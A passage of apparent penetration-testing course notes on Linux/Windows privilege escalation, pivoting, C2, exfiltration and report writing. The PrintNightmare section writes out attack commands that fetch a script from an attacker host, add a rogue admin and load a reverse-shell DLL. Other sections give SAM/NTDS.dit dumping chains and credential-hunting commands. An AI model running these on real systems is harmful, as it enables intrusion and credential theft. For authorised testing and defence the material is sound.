be invoked with ; the resulting NULL pointer dereferenced argv parsing reads from and writes attacker controlled env back to argv → arbitrary from a SUID root binary → LD PRELOAD or CHARSET injection → root | Extremely reliable , near universal applicability, fast — go to modern Linux privesc | | CVE 2022 0847 | DirtyPipe | Linux 5.8 – 5.16.10 (5.15.25, 5.10.102, 5.16.11 patched) | Pipe flags initialisation bug allows writing into the page cache of files the user has only read access to → overwrite read only files (SUID binary, ) | Very reliable; compiled in seconds | | CVE 2023 32233 | Netfilter nf tables UAF | 6.x kernels | Use after free in nf tables → root | Still emerging | | CVE 2024 1086 | nf tables double free | up to 6.6, 6.4 patched | Notable late 2024 nf tables exploitation primitive | Modern, reliable | PwnKit — The Universal Modern Linux Privesc PwnKit is the answer for the vast majority of unpatched Linux boxes you'll see in CTFs and many enterprise environments through 2022–2024 patch cycles. DirtyPipe — Quick Path to SUID Hijack The original Max Kellermann PoC overwrites a chosen SUID binary with attacker shellcode embedded in the file's page cache. After exploitation, simply running the SUID binary spawns a root shell. Sudo Baron Samedit — When Sudo Is Old CVE 2019 14287 — sudo General Notes on Kernel Exploits Always have a stable revert path. If the exploit panics the kernel, you may lose your foothold permanently. Coordinate with the engagement contact before running on production. Avoid in production engagements when there's a cleaner path. PwnKit on a heavily monitored box still leaves a trail (audit, EDR). A misconfigured SUID with GTFOBins is invisible by comparison. Compile on a matching kernel. Static link or compile on a similar version + arch when possible. Many privesc PoCs embed offsets/structures that change subtly across kernels. Document everything in your report — exploit name, CVE, kernel version, source PoC URL, commit hash, time of execution. Defenders will need this for IR, and the customer will appreciate the clarity.

path: PHANTOM/MODULE 6 — Privilege Escalation/06.2 — Windows Privilege Escalation.md
title: 06.2 — Windows Privilege Escalation
body: 06.2 — Windows Privilege Escalation The Goal You have a shell as a low privilege Windows user. The target is NT AUTHORITY\SYSTEM or local Administrator — the two highest privilege contexts on a Windows machine. The methodology mirrors Linux: enumerate everything, find the weakest misconfiguration, exploit it. Initial Enumeration — First 60 Seconds Token Impersonation (SeImpersonatePrivilege) What It Is Windows uses access tokens to represent security context. Certain service accounts (IIS, SQL Server, network services) have — the right to impersonate another user's token. If you land a shell as one of these service accounts, you can impersonate SYSTEM via token theft. JuicyPotato / RoguePotato / PrintSpoofer / GodPotato These tools exploit token impersonation to escalate from service account → SYSTEM. Which one works depends on the Windows version. [!tip] If you have a Meterpreter shell, use the command first — it tries multiple token impersonation techniques automatically. If that fails, manually upload and run PrintSpoofer or GodPotato. Incognito — Token Impersonation via Meterpreter Unquoted Service Paths What It Is When a Windows service's binary path contains spaces and is not quoted , Windows tries to resolve it by attempting multiple path interpretations. If you can write to (or any earlier path component), Windows runs your file as SYSTEM when the service starts. Finding Unquoted Service Paths Exploiting Unquoted Service Path Weak Service Permissions Services configured to allow low privilege users to modify their binary path or restart them. Exploiting Weak Service Permissions DLL Hijacking What It Is Windows applications load DLLs (Dynamic Link Libraries) in a specific search order. If a DLL is missing and the application searches a directory you can write to before finding the real DLL, you can plant a malicious DLL. Windows DLL search order (simplified): 1. Application directory 2. System directory ( ) 3. Windows directory ( ) 4. Current directory 5. Directories in PATH If a privileged application searches for a DLL in a user writable location → DLL hijacking. Finding DLL Hijack Opportunities Creating a Malicious DLL AlwaysInstallElevated If both of these registry keys are set to 1, any user can install packages with SYSTEM privileges. Exploit Stored Credentials Windows Credential Manager SAM and Registry Hives (Local Hash Dump) PowerShell History Search for Passwords in Files Scheduled Tasks Abuse Potato Exploits Quick Selection Guide | Exploit | Windows Version | Privilege Required | | | | | | PrintSpoofer | Win 10 / Server 2016+ | SeImpersonatePrivilege | | GodPotato | Win 8–11 / Server 2012–2022 | SeImpersonatePrivilege | | JuicyPotato | Win 7–10 / Server 2008–2016 | SeImpersonatePrivilege | | RoguePotato | Server 2019 | SeImpersonatePrivilege | | SweetPotato | Win 10 / Server 2019 | SeImpersonatePrivilege | Metasploit Local Exploit Suggester After getting a Meterpreter session, use this to automatically identify applicable local exploits: Output ranks applicable exploits by likelihood of success. Try them top down. Quick Reference | Vector | Check | Exploit | | | | | | SeImpersonatePrivilege | | PrintSpoofer / GodPotato | | Unquoted service path | | Drop exe in path gap | | Weak service ACL | | Modify binPath | | DLL hijacking | ProcMon NAME NOT FOUND | Drop malicious DLL | | AlwaysInstallElevated | reg query both keys | msfvenom MSI | | Stored credentials | | | | Scheduled tasks | | Modify writable script | | Unattend.xml | Check Panther dir | Extract admin password | Related Notes 06.1 — Linux Privilege Escalation 06.3 — PrivEsc Tools Reference 04.2 — Credential Attacks MODULE 7 — Post Exploitation & Pivoting SAM / SYSTEM / SECURITY — Local Hash Dumping In Depth When you reach Administrator/SYSTEM on a Windows host, dumping the local credential stores is one of the fastest pivots: the hashes go straight into pass the hash, password sprays, or offline cracking, and they reveal the local admin password (which is reused across machines depressingly often). The local credential material lives in three registry hives: | Hive | Contents | Why you want it | | | | | | | Local user database — RIDs, NTLM hashes (LM if pre Vista) | Local Administrator hash, all local accounts | | | Encryption keys ( / ) needed to decrypt SAM and SECURITY | Required for both other extractions | | | LSA secrets — cached domain credentials, service account passwords (often plaintext for older services), (computer account password) | Domain creds even on workgroup detached boxes | Method 1 — (Standard Path) The cleanest method on a live system. Requires (admin/SYSTEM has it). Method 2 — Volume Shadow Copy (When Is Blocked) If is being blocked by EDR / lacks privilege / Defender is interfering, falling through Volume Shadow Copy Service is the durable fallback. PowerShell only equivalent (when is restricted): Method 3 — Mimikatz In Memory (Fast But Loud) If you've got SYSTEM and AMSI/EDR isn't slamming Mimikatz, this gets you everything in one shot — local SAM, LSASS plaintexts, Kerberos tickets, DPAPI keys. WDigest plaintext caveat: Pre 2014 Windows cached the user's plaintext password in LSASS via WDigest for SSO. Post Win 8.1 / Server 2012 R2 with KB2871997 + , plaintext is no longer cached. You can flip it back on as admin and wait for someone to log in ( ) but that's noisy and requires patience. Modern boxes give you NTLM hashes from LSASS, not plaintext. Method 4 — Process Dump LSASS (EDR Aware) When Mimikatz fails (signatures, AMSI), dump LSASS to a file and parse offline. NTDS.dit — Domain Controller's Hash Dump NTDS.dit is the Active Directory database. It contains every domain account's NTLM hash. With it, you own the domain — Pass the Hash as any user, forge Golden Tickets with the krbtgt hash. Detection / Why This Trips Alarms | Action | EventID / signal | | | | | of SAM/SYSTEM | EventID 4663 (object access) on SAM hive, parent process is reg.exe | | | EventID 4688 (process creation) for vssadmin.exe (rare in normal usage) — easy detection rule | | Mimikatz running | AMSI block, EDR signature on , suspicious — most EDRs alert on this | | | EventID 4688 with rundll32 + MiniDump argument — very high fidelity detection rule | | LSASS read access | Microsoft Defender for Endpoint explicitly alerts on cross process LSASS read | | NTDS extraction | EventID 4662 (replication) when DCSync is used — high fidelity if from a non DC source | LSA Protection (RunAsPPL) — adding makes LSASS a Protected Process Light; only signed Microsoft processes can read it. This breaks Mimikatz . Bypasses exist (driver loading like Mimikatz's , BYOVD techniques) but they all trip EDRs. Credential Guard (Windows 10+, Enterprise/Education) — runs LSASS secrets in a hardware isolated VBS container. Even SYSTEM on the host kernel can't read them. When you see Credential Guard enabled, the LSASS dump path no longer yields plaintext or NTLM hashes — only Kerberos service tickets remain useful. will return empty hashes. PowerUp — One Stop Privesc Enumeration PowerUp.ps1 is the Windows analogue of LinPEAS — a single PowerShell script that runs every standard local privesc check. prints a summary at the end with the abuse function for each finding ( ). Read each finding with the abuse fn name and execute when you've verified. For a more modern equivalent: winPEAS is the WinPEAS counterpart with the same colour coded output as LinPEAS — recommended over PowerUp for thoroughness. Drop and run. PrintNightmare (CVE 2021 34527 and CVE 2021 1675) What It Is PrintNightmare is a critical Windows Print Spooler vulnerability that allows both local and remote privilege escalation. Two related CVEs affect the same service: CVE 2021 1675 — local privilege escalation via the Print Spooler service CVE 2021 34527 — remote code execution + local privesc via the same service Both allow a low privilege domain user to execute code as SYSTEM by abusing the AddPrinterDriver functionality. The Print Spooler service runs as SYSTEM and loads printer drivers supplied by authenticated users — it does not verify driver signatures when loaded via certain RPC calls. Affected Systems Virtually all Windows versions released before Microsoft's July 2021 patch, including: Windows 7 through Windows 10 Windows Server 2008 through Server 2019 Check for the patch: wmic qfe get HotFixID | findstr KB5004945 wmic qfe get HotFixID | findstr KB5004946 wmic qfe get HotFixID | findstr KB5004947 If none of the July 2021 KBs are present on an older system, it is likely vulnerable. Also check if the Print Spooler service is running: sc query spooler Get Service Name Spooler If the service is running and the patch is absent, proceed. Local Privilege Escalation (From a Low Privilege Local Shell) Using the PowerShell PoC by calebstewart: Load in memory (no disk write) Import Module .\CVE 2021 1675.ps1 Or load directly from your attacker HTTP server IEX (New Object Net.WebClient).DownloadString('http://ATTACKER IP/CVE 2021 1675.ps1') Add a new local administrator account Invoke Nightmare NewUser "hacker" NewPassword "Hacker@123" DriverName "PrintMe" Verify net localgroup administrators Now connect as the new local admin evil winrm i TARGET u hacker p 'Hacker@123' Using the Python/Impacket PoC (cube0x0's version) from Linux: Install git clone https://github.com/cube0x0/CVE 2021 1675 pip3 install impacket Generate a malicious DLL payload msfvenom p windows/x64/shell reverse tcp LHOST=ATTACKER IP LPORT=4444 \ f dll o evil.dll Host the DLL on an SMB share sudo impacket smbserver share /tmp/share smb2support Set up listener nc lvnp 4444 Trigger the exploit (as any authenticated domain user) python3 CVE 2021 1675.py corp.local/jsmith:Password123@192.168.1.10 \ '\\ATTACKER IP\share\evil.dll' Remote Code Execution (CVE 2021 34527) The remote variant allows any authenticated domain user to trigger RCE on a remote Windows host that has the Spooler service running and exposed. Same Python PoC — works remotely python3 CVE 2021 1675.py corp.local/jsmith:Password123@192.168.1.50 \ '\\ATTACKER IP\share\evil.dll' The DLL executes as SYSTEM on the remote host (192.168.1.50) Checking if RPC PrintSpooler is Remotely Accessible From Kali rpcdump.py corp.local/jsmith:Password123@192.168.1.50 | grep i spoolss If MS RPRN (spoolss) appears in the output, the remote attack is viable Mitigation (For Reports) The primary fix is to apply Microsoft's July 2021 cumulative update (KB5004945 or equivalent for the OS version). If patching is not immediately possible: Disable the Print Spooler service on systems that do not need printing Stop Service Name Spooler Force Set Service Name Spooler StartupType Disabled If printing is required, restrict remote access to the spooler Group Policy: Computer Configuration Administrative Templates Printers "Allow Print Spooler to accept client connections" Disabled (Disables remote printing but keeps local printing functional) SeBackupPrivilege — Reading Any File as Non Admin What It Is SeBackupPrivilege is a Windows privilege that grants the ability to read any file on the system regardless of the file's DACL (discretionary access control list). It was designed to allow backup software to read all files without needing to take ownership. When held by a low privilege user, it allows reading files that are otherwise restricted — including the SAM hive and NTDS.dit. The privilege is typically assigned to: Members of the Backup Operators group Service accounts used by backup software Occasionally misconfigured accounts in enterprise environments Detecting SeBackupPrivilege whoami /priv Look for: SeBackupPrivilege Back up files and directories Enabled Or via PowerShell [System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent() If you have a shell as a member of the Backup Operators group but SeBackupPrivilege shows as Disabled, you need to enable it: Enable privileges in current process using PowerShell (PowerShell does not automatically enable all assigned privileges) Option 1: Use a new cmd.exe process (privileges auto enabled in cmd) If evil winrm: just use cmd commands, not PowerShell Option 2: Use PsExec to get a proper session with full privileges PsExec64.exe i cmd.exe whoami /priv SeBackupPrivilege should now show Enabled Exploiting SeBackupPrivilege — Dump SAM and SYSTEM (Local Machine) SeBackupPrivilege allows using robocopy or the Win32 backup API to read protected files. The standard path is to dump SAM + SYSTEM from a live system: Method 1: reg save (works via cmd when SeBackupPrivilege is active) reg save HKLM\SAM C:\Windows\Temp\sam.hive reg save HKLM\SYSTEM C:\Windows\Temp\sys.hive reg save HKLM\SECURITY C:\Windows\Temp\sec.hive Transfer to Kali and extract hashes (via SMB share, evil winrm download, or scp) impacket secretsdump sam sam.hive system sys.hive security sec.hive LOCAL Method 2: If reg save is blocked, use diskshadow + robocopy Create a diskshadow script echo "set context persistent nowriters" C:\Windows\Temp\shadow.txt echo "add volume c: alias temp shadow" C:\Windows\Temp\shadow.txt echo "create" C:\Windows\Temp\shadow.txt echo "expose %temp shadow% z:" C:\Windows\Temp\shadow.txt diskshadow /s C:\Windows\Temp\shadow.txt Creates a shadow copy of C: mounted as Z: Now robocopy can read SAM from the shadow copy (bypasses live file lock) robocopy /b Z:\Windows\System32\Config C:\Windows\Temp SAM SYSTEM SECURITY /b = backup mode — uses SeBackupPrivilege Transfer and extract impacket secretsdump sam C:\Windows\Temp\SAM system C:\Windows\Temp\SYSTEM LOCAL Exploiting SeBackupPrivilege — Dump NTDS.dit (Domain Controller) If you have SeBackupPrivilege on a Domain Controller (e.g., via Backup Operators membership), you can extract NTDS.dit — the AD database containing all domain password hashes. Step 1: Create a shadow copy of the C: drive on the DC Using diskshadow (interactive mode): diskshadow set context persistent nowriters set metadata C:\Windows\Temp\meta.cab set verbose on begin backup add volume C: alias cdrive create expose %cdrive% Z: end backup exit Step 2: Copy NTDS.dit from the shadow copy using robocopy /b robocopy /b Z:\Windows\NTDS C:\Windows\Temp ntds.dit robocopy /b Z:\Windows\System32\Config C:\Windows\Temp SYSTEM Step 3: Transfer both files to Kali Step 4: Extract all domain hashes impacket secretsdump ntds C:\Windows\Temp\ntds.dit \ system C:\Windows\Temp\SYSTEM LOCAL Output: every domain account's NTLM hash Use krbtgt hash for Golden Ticket (see 04.4) Use administrator hash for Pass the Hash SeBackupPrivilege — Local Privesc via Writable Services If running as a Backup Operator on a standalone (non DC) machine, an alternative path is to use the write counterpart (SeRestorePrivilege, often granted alongside SeBackupPrivilege) to overwrite a service binary: whoami /priv Look for BOTH: SeBackupPrivilege Enabled SeRestorePrivilege Enabled With SeRestorePrivilege: overwrite a service binary that runs as SYSTEM (Use the DLL hijack / service binary replacement methodology from the main note above) robocopy /b can copy files INTO protected locations when SeRestorePrivilege is active Backup Operators Group — Lateral Movement to DC Membership in the Backup Operators group grants SeBackupPrivilege and also the right to log on locally to Domain Controllers (even for non admin accounts). This is a direct DA path in many environments: Check if current user is in Backup Operators net user %username% /domain | findstr "Backup" Get ADGroupMember "Backup Operators" | Where Object {$ .SamAccountName eq $env:USERNAME} If yes: can RDP or PSExec to DC with low privilege credentials Then dump NTDS.dit as described above evil winrm i DC01 u backupuser p 'Password123' Once on DC: run the diskshadow + robocopy + secretsdump chain PrivEsc Exploit Reference — Updated Table Add these to the existing Quick Reference table: CVE | Name | Affected | Mechanism CVE 2021 34527 | PrintNightmare | All Windows (pre Jul 2021 patch) | Print Spooler SYSTEM DLL load CVE 2021 1675 | PrintNightmare LP | All Windows (pre Jul 2021 patch) | Print Spooler local privesc SeBackupPrivilege | Backup Operators | Any Windows with Backup Ops group | Read SAM/NTDS.dit without admin SeRestorePrivilege| Restore Privilege | Any Windows with Restore rights | Write to protected paths Detection commands summary: PrintNightmare sc query spooler Is the service running? wmic qfe get HotFixID | findstr KB5004945 Is the patch present? SeBackupPrivilege whoami /priv | findstr Backup Do I have this privilege? net localgroup "Backup Operators" Who has it? Get ADGroupMember "Backup Operators" Domain wide check Related Notes (Updated) 06.1 Linux Privilege Escalation 06.3 PrivEsc Tools Reference 04.2 Credential Attacks 04.5 ADCS Certificate Abuse 07.1 Persistence & Post Exploitation

title: 06.3 — PrivEsc Tools Reference
body: 06.3 — PrivEsc Tools Reference The Tool Workflow Manual enumeration builds situational awareness. Automated tools scale coverage so you don't miss anything. Workflow: LinPEAS — Linux Privilege Escalation Awesome Script LinPEAS is the most comprehensive Linux privilege escalation enumeration script. It checks hundreds of vectors, colour codes results by severity, and saves hours of manual work. Red = critical / definitely check Yellow = interesting Green = configuration details Getting LinPEAS onto the Target What LinPEAS Checks LinPEAS covers 300+ checks including: Key Red Findings to Act On First WinPEAS — Windows Privilege Escalation Awesome Script WinPEAS is the Windows equivalent. Runs as an executable (winPEASx64.exe) or PowerShell script. Getting WinPEAS onto Target What WinPEAS Checks Key Red Findings GTFOBins — Linux Binary Exploit Reference GTFOBins (https://gtfobins.github.io) documents how to abuse Unix binaries for: Sudo privilege escalation SUID exploitation Shell escapes from restricted environments File read/write Reverse shells How to Use It 1. Find a binary via or 2. Go to https://gtfobins.github.io 3. Search the binary name 4. Click the relevant category (Sudo, SUID, Shell, File Read, etc.) 5. Copy the command Most Impactful GTFOBins Entries LOLBAS — Living Off the Land Binaries and Scripts (Windows) LOLBAS (https://lolbas project.github.io) is the Windows equivalent of GTFOBins. Documents how to abuse legitimate Windows binaries for: Code execution File download File copy UAC bypass AMSI bypass Key LOLBAS Entries PowerUp — Windows Privesc Automation (PowerShell) PowerUp is a PowerShell script that checks for common Windows privesc misconfigurations. pspy — Process Spy (Linux, No Root) pspy monitors Linux processes without root . Watches for new processes being spawned — including cron jobs. Example output showing a root cron job: → Find , check if writable, append payload. Transferring Files to Targets Getting tools onto the target is half the battle. Linux — Receiving Files Windows — Receiving Files Host Files from Kali Quick Reference — Entire Module 6 | Tool | OS | Purpose | Key Output | | | | | | | LinPEAS | Linux | Full automated enum | Red = critical findings | | WinPEAS | Windows | Full automated enum | Colour coded findings | | GTFOBins | Linux | Binary abuse reference | Commands per binary | | LOLBAS | Windows | Binary abuse reference | Commands per binary | | PowerUp | Windows | Service/config enum | Auto exploit options | | pspy | Linux | Process monitoring | Root cron jobs | Related Notes 06.1 — Linux Privilege Escalation 06.2 — Windows Privilege Escalation MODULE 7 — Post Exploitation & Pivoting MODULE 4 — Active Directory Pentesting

path: PHANTOM/MODULE 7 — Post-Exploitation & Pivoting/07.1 — Persistence & Post-Exploitation.md
title: 07.1 — Persistence & Post-Exploitation
body:
07.1 — Persistence & Post Exploitation What Post Exploitation Is Getting a shell is not the objective. It is the beginning of the actual work. Post exploitation is everything you do after initial access to: 1. Understand where you are — situational awareness 2. Escalate privileges — covered in MODULE 6; assumed complete before this note 3. Establish persistence — survive reboots, logouts, and detection attempts 4. Move laterally — reach additional systems 5. Complete the objective — access target data, demonstrate impact Every action post exploitation should be deliberate. Running tools blindly generates noise, leaves artifacts, and may crash services. Think before you execute. Phase 1 — Situational Awareness (Do This First, Every Time) Before doing anything else on a compromised host, answer these six questions. On Linux id; whoami; groups; sudo l hostname; uname a; cat /etc/os release w; who; last | head 20 ip a; ip route; cat /etc/hosts; ss tlnp; arp a ps auxf; systemctl list units type=service state=running 2 /dev/null for i in $(seq 1 254); do ping c1 W1 10.10.10.$i & /dev/null && echo "10.10.10.$i up"; done On Windows whoami; whoami /priv; whoami /groups hostname; systeminfo; ipconfig /all net users; net localgroup administrators; query user route print; arp a; netstat ano tasklist /v; sc query; wmic service get name,startname,pathname nltest /dsgetdc:corp.local; net group "Domain Admins" /domain Phase 2 — Credential Hunting Linux cat /etc/shadow find /var/www name " .php" exec grep l "password\|db pass" {} \; 2 /dev/null find / name ".env" readable 2 /dev/null | xargs cat 2 /dev/null find /home name "id rsa" o name "id ed25519" 2 /dev/null cat /home/ /.bash history 2 /dev/null find / name " .kdbx" 2 /dev/null cat /home/ /.ssh/known hosts 2 /dev/null find / name ".git credentials" readable 2 /dev/null | xargs cat 2 /dev/null Windows type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost history.txt cmdkey /list type C:\Windows\Panther\Unattend.xml 2 nul path: PHANTOM/MODULE 7 — Post-Exploitation & Pivoting/07.2 — Pivoting & Tunnelling.md
title: 07.2 — Pivoting & Tunnelling
body: 07.2 — Pivoting & Tunnelling What Pivoting Is Pivoting uses a compromised host as a relay to reach network segments that are not directly accessible from your attacker machine. The compromised host becomes your "jump box." You can reach 192.168.1.50 directly. You cannot reach 10.10.10.5. But 192.168.1.50 can. So you route traffic through it. Port Forwarding Local Port Forwarding — Bring a Remote Port to Your Machine Forwards a port on your machine to a port on a remote system via an intermediary. Use case: A service on the internal network is only accessible from inside. You want to reach it from your Kali box. SSH Local Port Forward Remote Port Forwarding — Expose Your Machine to the Target Network Forwards a port on the remote machine back to your machine. Use case: You need a target deeper in the network to connect back to your Netcat listener, but your machine isn't reachable from that segment. You expose your listener port through the pivot. Dynamic Port Forwarding — SOCKS Proxy Creates a SOCKS5 proxy through the SSH connection. Route any tool's traffic through the pivot. [!tip] Use (TCP Connect) with proxychains + nmap — SYN scan ( ) won't work through a SOCKS proxy because it requires raw sockets. Chisel — Fast TCP Tunnelling Chisel is a fast TCP tunnelling tool that works over HTTP. Useful when SSH isn't available or when you want to avoid SSH logs. Chisel SOCKS Proxy (Most Common Use) Chisel Local Port Forward ligolo ng — Transparent Pivoting ligolo ng creates a TUN interface on your Kali that routes traffic to the internal network as if you were directly connected. No proxychains needed — all tools work natively. ligolo ng Setup [!tip] ligolo ng is the cleanest pivoting solution. Unlike proxychains, it doesn't break tools that use UDP, it supports ICMP, and there's no performance overhead from proxychains wrapping. Use it when you can. Metasploit Pivoting If your pivot shell is a Meterpreter session: SSH Key Based Pivoting (No Password) If you found SSH private keys on a compromised host, use them for further pivoting without needing passwords. Multi Hop Pivoting Sometimes you need to pivot through two or more hops to reach the deepest target. SSH Multi Hop (ProxyJump) Chisel Multi Hop Network Discovery Through the Pivot Once you can reach the internal network, enumerate it: Quick Reference | Tool | Mechanism | Best For | | | | | | SSH D | SOCKS5 proxy | Simple pivots, SSH available | | SSH L/ R | Port forward | Single service access | | Chisel | HTTP tunnel | No SSH, firewall bypass | | ligolo ng | TUN interface | Clean multi protocol pivoting | | MSF route | MSF internal | Metasploit only tool chain | Related Notes 07.1 — Persistence & Post Exploitation 07.3 — C2 Frameworks & Data Exfiltration 03.2 — Metasploit Framework MODULE 4 — Active Directory Pentesting

path: PHANTOM/MODULE 7 — Post-Exploitation & Pivoting/07.3 — C2 Frameworks & Data Exfiltration.md
title: 07.3 — C2 Frameworks & Data Exfiltration
body: 07.3 — C2 Frameworks & Data Exfiltration Command and Control (C2) Overview A C2 framework is a platform for managing compromised hosts — issuing commands, receiving output, transferring files, and managing multiple sessions from a single interface. Metasploit is a C2 in the broad sense. Dedicated red team C2 frameworks go further: encrypted communications, evasion, team collaboration, sophisticated payload staging, and long term campaign management. [!warning] C2 frameworks are dual use. The concepts documented here are essential for understanding adversary behaviour (detection, blue teaming, threat intel) and for authorised red team engagements. Running C2 infrastructure against systems without explicit written authorisation is illegal under the Computer Misuse Act 1990 (UK) and equivalent laws worldwide. C2 Concepts The C2 Communication Model Key properties of a mature C2: Encrypted comms — traffic is encrypted end to end Malleable profiles — traffic can be made to look like legitimate services (Office365, CDN, etc.) Sleep / jitter — beacons don't phone home on a fixed interval (avoids pattern detection) Staging — small initial payload pulls down the full agent OPSEC safe post exploitation — runs tools in memory, avoids writing to disk Beacon vs Bind Beacon (Reverse): Implant contacts the C2 server periodically. Bypasses inbound firewall. Most common. Bind: C2 server connects to a listener on the implant. Useful when the target can't make outbound connections. Metasploit as C2 Already covered fully in 03.2 — Metasploit Framework. Summary: Sliver — Open Source C2 Framework Sliver is an open source C2 maintained by BishopFox. Designed as a professional grade alternative to Cobalt Strike. Supports multiplayer (team operation), multiple protocols (HTTPS, DNS, mTLS, WireGuard), and generates implants in Go (harder to detect than Metasploit payloads). Havoc — Modern C2 Framework Havoc is a modern C2 with a Qt based GUI, Demon implant (written in C), and extensive evasion capabilities. Comparable feature set to Cobalt Strike. Cobalt Strike (Commercial — Concept Reference) Cobalt Strike is the most widely used commercial C2 in enterprise red teaming ( $5,000/year/operator). Understanding its concepts is important because: Most mature blue team detections are tuned against Cobalt Strike signatures Understanding it helps you detect it as a defender Many attackers use cracked/leaked versions — you'll encounter its artifacts in incident response Key concepts: Beacon — Cobalt Strike's implant. Sleeps between callbacks (default 60s). Sleep with jitter to avoid pattern detection. Malleable C2 Profiles — customise beacon's network traffic to mimic any legitimate service (Amazon, Slack, Google) Aggressor Script — extend Cobalt Strike functionality with custom post exploitation Teamserver — the C2 server Arsenal Kit — evasion toolkit (AMSI bypass, sleep masking, etc.) AMSI and Defender Bypass (Concepts) Windows Defender and AMSI (Antimalware Scan Interface) are the primary AV/EDR obstacles on modern Windows. Bypassing them is essential for effective post exploitation. [!warning] These techniques are documented for authorised red team engagements and defensive understanding only. They are used by real adversaries and understanding them is essential for detection engineering. AMSI Overview AMSI hooks into PowerShell, VBA macros, and .NET to scan code before execution. If malicious patterns are detected, execution is blocked. AMSI Bypass (PowerShell — Concept) Bypasses work by patching AMSI's scanning function in memory. Microsoft patches specific bypasses, but the cat and mouse continues. Common approaches: Defender Exclusion (if you have admin access) Data Exfiltration Demonstrating exfiltration as part of a pentest proves real world impact. Always agree the method and data handling with the client before exfiltrating anything — never exfiltrate real customer PII. HTTP/HTTPS Exfiltration DNS Exfiltration (Bypasses HTTP blocking firewalls) DNS is rarely blocked — firewalls allow DNS queries outbound. Encode data as subdomains. SMB Exfiltration ICMP Exfiltration (Concepts) ICMP (ping) packets can carry data in the payload field. Useful when only ICMP is allowed out. Covering Tracks [!warning] Covering tracks is documented here to help you understand what attackers do and how defenders can detect or prevent it. On authorised engagements, check your rules of engagement — some clients want tracks covered (stealth test), others want a full audit trail for blue team learning. Never destroy evidence in ways that cause lasting damage. Linux — Log Manipulation Windows — Log Manipulation Timestomping on Windows [!tip] On real red team engagements, the expectation is usually that your activity can eventually be detected — the question is how long it takes. Focus on blending in (using legitimate tools, normal business hours, normal traffic patterns) rather than clearing logs, which itself triggers alerts. Log clearing is a high confidence indicator of compromise. Quick Reference | C2 Framework | Cost | Key Feature | | | | | | Metasploit | Free | Widest exploit coverage | | Sliver | Free | Go implants, team ops, evasion | | Havoc | Free | Modern evasion, C implant, GUI | | Cobalt Strike | $5000/yr | Industry standard, malleable profiles | Related Notes 07.1 — Persistence & Post Exploitation 07.2 — Pivoting & Tunnelling 03.2 — Metasploit Framework MODULE 8 — Reporting

path: PHANTOM/MODULE 8 — Reporting/08.1 — Professional Pentest Reporting.md
title: 08.1 — Professional Pentest Reporting
body: 08.1 — Professional Pentest Reporting The Report Is the Product Everything you do technically is worthless if it isn't communicated clearly. The client hired you to make their organisation safer — the report is how that happens. A finding that isn't documented, scored, and explained with remediation guidance might as well not exist. Module 0 covered the structure. This module goes deeper on writing quality, CVSS scoring precision, and what separates a junior report from a senior one. Report Structure (Full) Executive Summary — Writing It Well The executive summary is read by people who will never read the rest of the report. It must: Be written in plain English (zero technical jargon) State the overall risk posture in one sentence List the 3–5 most critical findings by business impact State what the attacker could have done if this were real Not exceed 2 pages Bad executive summary: "The assessment identified multiple vulnerabilities including SQL injection (CWE 89), IDOR (CWE 284), and an unauthenticated RCE in the admin panel (CVE 2021 XXXX). CVSS scores ranged from 4.2 to 9.8." Good executive summary: "During the assessment, our team was able to obtain full administrative control of the customer portal within 4 hours of commencing testing, without requiring valid credentials. From this position, it would have been possible for an attacker to access the personal data of all 140,000 registered customers, modify order records, and use the compromised server as a foothold for further attacks against internal systems. The three issues that enabled this outcome are addressed as Priority 1 findings in this report and should be remediated within 30 days." The difference: business language, concrete impact, actionable priority. CVSS 3.1 Scoring — Doing It Properly Every finding needs a CVSS score. Get it right — incorrect scores lose client trust. Base Metric Quick Reference Worked Examples Unauthenticated SQL Injection → full DB dump: Stored XSS in admin comment field (must be admin to post, attacks other admins): Local privilege escalation via SUID binary: Missing HSTS header: Writing Individual Findings Each finding is a self contained document. A junior tester writes 3 sentences. A senior tester writes enough to let the development team understand, reproduce, and fix the issue without asking a single question. Finding Template — Fully Populated What Makes Remediation Guidance Good Bad: "Fix the SQL injection." Bad: "Use prepared statements." Good: "Replace all dynamic SQL query construction with parameterised queries (prepared statements). In PHP with PDO, replace: with: Apply this pattern consistently across all database interaction code — not only the affected endpoint. Conduct a code review of all database calls. As a secondary control, implement input validation to reject unexpected characters, but do not rely on this as the primary defence." The good version: names the exact fix, provides a code example, tells them to fix it everywhere (not just the one endpoint you found), and distinguishes primary from secondary controls. Attack Narrative (Red Team Reports) For red team engagements, the report includes an attack narrative — a timeline of the full compromise chain written as a story. This is the most valuable section for blue teams. Structure: Written in past tense, includes timestamps, references specific finding IDs for each step. Remediation Priority Framework Help clients prioritise: | Priority | Criteria | Timeframe | | | | | | P1 — Critical | Unauthenticated RCE, auth bypass, exposed secrets | 48–72 hours | | P2 — High | Authenticated RCE, SQLi, significant data exposure | 30 days | | P3 — Medium | IDOR with limited data access, CSRF, stored XSS | 60–90 days | | P4 — Low | Missing headers, info disclosure, best practice gaps | Next dev cycle | | P5 — Info | Observations without direct exploitability | At discretion | Common Report Mistakes (Junior vs Senior) | Junior | Senior | | | | | "SQL injection found on login page" | Full reproduction steps, query shown, data extracted as proof | | CVSS score guessed | CVSS vector string included with explicit justification | | "Use prepared statements" | Exact code fix with before/after example | | Lists every port Nmap found | Only includes findings relevant to risk | | Marks self XSS as High | Self XSS = Informational (only affects attacker) | | Separate finding for every missing header | Groups as one Medium "Missing Security Headers" finding | | No evidence for a finding | Every finding has at least one screenshot or request/response | Quick Reference Related Notes 00.2 — Report Writing MODULE 9 — Labs & Practice Resources 02.1 — OWASP Top 10 & Burp Suite
